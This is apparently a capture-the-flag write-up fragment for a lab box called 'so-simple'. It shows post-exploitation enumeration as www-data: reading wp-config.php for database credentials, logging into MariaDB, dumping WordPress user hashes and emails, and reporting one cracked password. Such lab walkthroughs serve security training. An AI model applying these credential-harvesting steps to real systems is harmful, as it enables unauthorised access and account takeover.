# 4 box enum\_1 www-data

```
www-data@so-simple:/var/www/html/wordpress$ cat wp-config.php
	define( 'DB_NAME', 'wordpress' );
	define( 'DB_USER', 'wp_user' );
	define( 'DB_PASSWORD', 'password' );
	define( 'DB_HOST', 'localhost' );
	
www-data@so-simple:/var/www/html/wordpress$ cat secretkey.txt
SGFoYWhhaGFoYSwgaXQncyBub3QgdGhhdCBlYXN5ICEhISA=

$ echo -n "SGFoYWhhaGFoYSwgaXQncyBub3QgdGhhdCBlYXN5ICEhISA=" | base64 -d
Hahahahaha, it's not that easy !!! 

www-data@so-simple:/var/www/html/wordpress$ mysql -u wp_user -p

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [wordpress]> select user_login, user_pass, user_email from wp_users;
+------------+------------------------------------+----------------------+
| user_login | user_pass                          | user_email           |
+------------+------------------------------------+----------------------+
| admin      | $P$BqOIi8a7Jtcidgsi9y9WXw9UIfqD4q1 | admin@sosimple.local |
| max        | $P$BfDfIwyVLEQAVBrDn/ox9qT6uzgwwZ1 | max@sosimple.local   |
+------------+------------------------------------+----------------------+
2 rows in set (0.000 sec)

# cracked using wpscan
[SUCCESS] - max / opensesame

www-data@so-simple:/var/www/html$ cat mybackup.txt
JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF
```
